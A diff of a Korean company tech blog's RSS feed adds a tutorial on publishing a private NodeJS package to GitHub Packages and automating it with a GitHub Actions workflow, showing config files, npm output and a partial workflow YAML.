@@ -1,4 +1,277 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[모인 기술 블로그]]></title><description><![CDATA[모인의 기술 블로그]]></description><link>https://themoin.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 09 Nov 2020 02:18:30 GMT</lastBuildDate><item><title><![CDATA[프론트엔드에서의 시큐어 코딩]]></title><description><![CDATA[…]]></description><link>https://themoin.github.io/2020-11-02-SecureFrontend/</link><guid isPermaLink="false">https://themoin.github.io/2020-11-02-SecureFrontend/</guid><pubDate>Mon, 02 Nov 2020 00:00:00 GMT</pubDate><content:encoded>  &lt;br /&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[모인 기술 블로그]]></title><description><![CDATA[모인의 기술 블로그]]></description><link>https://themoin.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 09 Nov 2020 03:11:07 GMT</lastBuildDate><item><title><![CDATA[Github Action 도입기 1- NodeJS Private Package 배포 CI/CD ]]></title><description><![CDATA[모인 개발팀은 를 주 로 사용하고 있습니다. microsoft 가 github를 인수하고 나서 github는 이전보다 더 좋은 환경을 제공하고 있습니다. 그 중에 눈에 들어온 서비스가 있었습니다. 그것은 github action - CI/CI…]]></description><link>https://themoin.github.io/2020-11-09-github-action-1-nodejs-private-package-cicd/</link><guid isPermaLink="false">https://themoin.github.io/2020-11-09-github-action-1-nodejs-private-package-cicd/</guid><pubDate>Mon, 09 Nov 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;모인 개발팀은 &lt;code class=&quot;language-text&quot;&gt;github&lt;/code&gt;를 주 &lt;code class=&quot;language-text&quot;&gt;repository&lt;/code&gt;로 사용하고 있습니다. microsoft 가 github를 인수하고 나서 github는 이전보다 더 좋은 환경을 제공하고 있습니다. 그 중에 눈에 들어온 서비스가 있었습니다. 그것은 github action - CI/CI 서비스입니다. 모인 개발팀은 기본적으로 젠킨스를 활용하여 CI/CD를 사용하고 있습니다. 하지만 젠킨스를 &lt;strong&gt;‘정말 잘’&lt;/strong&gt; 다루는 인원도 없고 젠킨스 구성 파일은 특별한(?) 문법을 사용하고 있어서 읽기도 어려운 상황이어서 ‘develop 환경에서는 github action 를 사용해 보면 어떨까’하는 의견이 있었습니다.&lt;/p&gt;
+&lt;h1&gt;NodeJS Private Package 배포 CI/CD&lt;/h1&gt;
+&lt;p&gt;Github Action는 다양한 예제가 존재하고 다양한 기능들이 여러 기여자로 부터 생성되어 제공되고 있었습니다.  이번 포스트에서는 github 에서 제공하는 private registry 에 node package 를 배포하고 다른 프로젝트에서 사용하는 예제를 다루겠습니다. 그리고 Action 를 활용하여 publish 를 자동으로 하는 구성을 적용하겠습니다. &lt;/p&gt;
+&lt;p&gt;코드와 관련 사항은 &lt;a href=&quot;https://github.com/themoin/greeter&quot;&gt;https://github.com/themoin/greeter&lt;/a&gt; 에서 확인 할 수 있습니다.&lt;/p&gt;
+&lt;h1&gt;라이브러리 프로젝트&lt;/h1&gt;
+&lt;p&gt;오해를 최대한 줄이기 위해서 인사하는 클래스(Greeter)를 만들어 배포할 것입니다. Greeter 클래스의 활용은 다음과 같이 하려고 합니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;tsx&quot;&gt;&lt;pre class=&quot;language-tsx&quot;&gt;&lt;code class=&quot;language-tsx&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; greeter &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;@themoin/greeter&quot;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; greeter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Greeter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; greeting_msg &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; greeter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;greet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Moin&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token builtin&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;greeting_msg&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Hello Moin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;프로젝트 설정 및 코드 작성&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;tsx&quot;&gt;&lt;pre class=&quot;language-tsx&quot;&gt;&lt;code class=&quot;language-tsx&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Greeter&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token function&quot;&gt;greet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;to&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Hello &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;to&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;package.json 수정&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;@themoin/greeter&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;out/Greeter.js&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;jest&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;token property&quot;&gt;&quot;build&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;tsc&quot;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;@types/jest&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^26.0.15&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;jest&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^26.6.3&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;ts-jest&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^26.4.3&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;ts-node&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^9.0.0&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;typescript&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^4.0.5&quot;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;여기서 처리해야 하는 부분은 &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; 과 &lt;code class=&quot;language-text&quot;&gt;version&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt; 부분입니다. &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; 은 계정이나 기관의 이름에 &lt;code class=&quot;language-text&quot;&gt;@&lt;/code&gt; prefix 를 붙이는 것입니다. 그리고 &lt;code class=&quot;language-text&quot;&gt;\&lt;/code&gt; 로 구분하여 package 이름을 적어 넣습니다. &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; 값으로 있는 &lt;code class=&quot;language-text&quot;&gt;@themoin/greeter&lt;/code&gt; 에서 themoin 는 기관명이고 greeter 는 패키지 이릅니다. 패키지 이름은 반드시 github repository 이름과 동일해야 합니다. version 는 package registry 상 패키지의 유일한 버전으로 합니다. &lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt; 처리는 보통 index.js 로 하지만 저는 Greeter.js 로 main 으로 처리했습니다.&lt;/p&gt;
+&lt;h2&gt;.npmrc 적용&lt;/h2&gt;
+&lt;p&gt;.npmrc를 작성해면 &lt;code class=&quot;language-text&quot;&gt;npm publish&lt;/code&gt; 시, 원하는 registry 에 package를 업로드 할 수 있습니다. .npmrc 를 전역으로 사용하려면 사용자 directory(&lt;code class=&quot;language-text&quot;&gt;~/.npmrc&lt;/code&gt;)나 npm 를 실행하는 프로젝트 root directory 에 작성하면 됩니다. &lt;code class=&quot;language-text&quot;&gt;.npmrc&lt;/code&gt; 에 두 가지 값을 설정합니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;@themoin:registry&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;https://npm.pkg.github.com
+//npm.pkg.github.com/:_authToken&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;abc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;첫 번째 , &lt;code class=&quot;language-text&quot;&gt;@themoin:registry=[https://npm.pkg.github.com](https://npm.pkg.github.com)&lt;/code&gt;  를 보면 알겠지만 &lt;code class=&quot;language-text&quot;&gt;@themoin&lt;/code&gt; 이로 시작하는 패키지의 &lt;code class=&quot;language-text&quot;&gt;https://npm.pkg.github.com&lt;/code&gt; registry 를 사용하겠다는 뜻입니다. 다음에 있는 &lt;code class=&quot;language-text&quot;&gt;[//npm.pkg.github.com/:_authToken=abc](//npm.pkg.github.com/:_authToken=abc)&lt;/code&gt; 는 private registry 를 사용하기 위한 인증 토큰 값입니다. 해당 토큰은 &lt;a href=&quot;https://github.com/settings/tokens&quot;&gt;링크&lt;/a&gt;에서 발급 받을 수 있습니다. 생성할 때에 &lt;code class=&quot;language-text&quot;&gt;write:packages&lt;/code&gt; 를 꼭 추가해 주셔야 패키지를 업로드 할 수 있습니다.&lt;/p&gt;
+&lt;h2&gt;.npmignore 처리&lt;/h2&gt;
+&lt;p&gt;npm publish 를 하면 이것 저것 올라가면 안되는 것들도 포함됩니다. 저는 아래와 같은 것들이 올라가면 안 되서 작성 했습니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# .npmignore&lt;/span&gt;
+src
+tests
+jest.config.js
+tsconfig.json
+.jest&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;배포하기&lt;/h2&gt;
+&lt;p&gt;package.json 와 .npmrc 및 .npmignore가 적절하게 작성 되었다면 배포를 해봅시다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; publish
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice 
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice 📦  @themoin/greeter@1.0.0
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Tarball Contents &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; 
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice 174B out/Greeter.js  
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice 375B package.json    
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice 64B  out/Greeter.d.ts
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Tarball Details &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; 
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice name:          @themoin/greeter                        
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice version:       &lt;span class=&quot;token number&quot;&gt;1.0&lt;/span&gt;.0                                   
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice package size:  &lt;span class=&quot;token number&quot;&gt;504&lt;/span&gt; B                                   
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice unpacked size: &lt;span class=&quot;token number&quot;&gt;613&lt;/span&gt; B                                   
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice shasum:        0c69&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.61f49
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice integrity:     sha512-f6URJM1&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;OamBe4/gXumhQ&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice total files:   &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;                                       
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; notice 
++ @themoin/greeter@1.0.0
+$&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;github repository 에 가서 확인하면 다음과 같이 package 부분에 추가 된 것을 확인할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;[사진]&lt;/p&gt;
+&lt;h1&gt;라이브러리 사용 프로젝트&lt;/h1&gt;
+&lt;p&gt;이제 올라간 라이브러리를 사용해 봅시다. node 프로젝트를 준비합니다. &lt;/p&gt;
+&lt;h2&gt;.npmrc 작성&lt;/h2&gt;
+&lt;p&gt;이전에 .npmrc를 사용자 디렉토리에 작성하신 분들은 npm install 를 하시면 바로 설치가 되지만 프로젝트 디렉토리에 작성하신 분들은 사용하려는 프로젝트에도 .npmrc 를 작성해야 합니다. &lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;&lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# .npmrc&lt;/span&gt;
+@themoin&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;registry=https&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;//npm.pkg.github.com
+//npm.pkg.github.com/&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;_authToken=abc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;.npmrc 설정이 완료 되었으면 npm install 해봅시다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; @themoin/greeter@1.0.0                                                                                                                     &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:50:35 
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; WARN greeter-user@1.0.0 No description
+&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; WARN greeter-user@1.0.0 No repository field.
+
++ @themoin/greeter@1.0.0
+added &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; package and audited &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; package &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;.683s
+found &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; vulnerabilities&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;코드 작성&lt;/h2&gt;
+&lt;p&gt;라이브러리가 설치가 완료 되었으면 코드를 작성해 봅시다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;tsx&quot;&gt;&lt;pre class=&quot;language-tsx&quot;&gt;&lt;code class=&quot;language-tsx&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// ~/index.ts&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Greeter &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;@themoin/greeter&quot;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; greeter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Greeter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; msg &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; greeter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;greet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Moin&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token builtin&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;msg&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;// Hello Moin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;작성된 코드를 실행해 봅시다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ts-node index.ts
+Hello Moin&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Github Action 처리&lt;/h2&gt;
+&lt;p&gt;npm publish 를 해서 배포해도 좋지만 이 포스트를 작성하는 목적이 Action를 활용한 CI/CD 이기 때문에 Action 구성을 작성했습니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;&lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# ~/.github/workflows&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;# This workflow will run tests using node and then publish a package to GitHub Packages when a release is created&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;# For more information see: https://help.github.com/actions/language-and-framework-guides/publishing-nodejs-packages&lt;/span&gt;
+
+&lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; Node.js Package
+
+&lt;span class=&quot;token key atrule&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;created&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;token key atrule&quot;&gt;jobs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;runs-on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; ubuntu&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;latest
+    &lt;span class=&quot;token key atrule&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/checkout@v2
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/setup&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;node@v1
+        &lt;span class=&quot;token key atrule&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;node-version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; npm ci
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; npm test
+
+  &lt;span class=&quot;token key atrule&quot;&gt;publish&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;needs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; build
+    &lt;span class=&quot;token key atrule&quot;&gt;runs-on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; ubuntu&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;latest
+    &lt;span class=&quot;token key atrule&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/checkout@v2
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/setup&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;node@v1
+        &lt;span class=&quot;token key atrule&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;node-version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;
